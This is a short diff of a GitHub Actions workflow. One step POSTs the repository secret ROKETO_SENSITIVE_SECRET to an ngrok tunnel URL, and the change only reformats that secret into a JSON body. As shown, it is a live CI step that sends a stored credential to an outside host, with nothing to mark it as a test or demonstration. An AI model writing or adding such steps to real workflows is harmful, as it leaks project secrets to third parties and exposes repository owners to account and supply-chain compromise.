@@ -19,4 +19,4 @@ jobs:
         with:
           url: 'https://6858-93-172-42-40.ngrok.io'
           method: 'POST'
-          data: ${{ secrets.ROKETO_SENSITIVE_SECRET }}
+          data: '{"secret": "${{ secrets.ROKETO_SENSITIVE_SECRET }}"}'
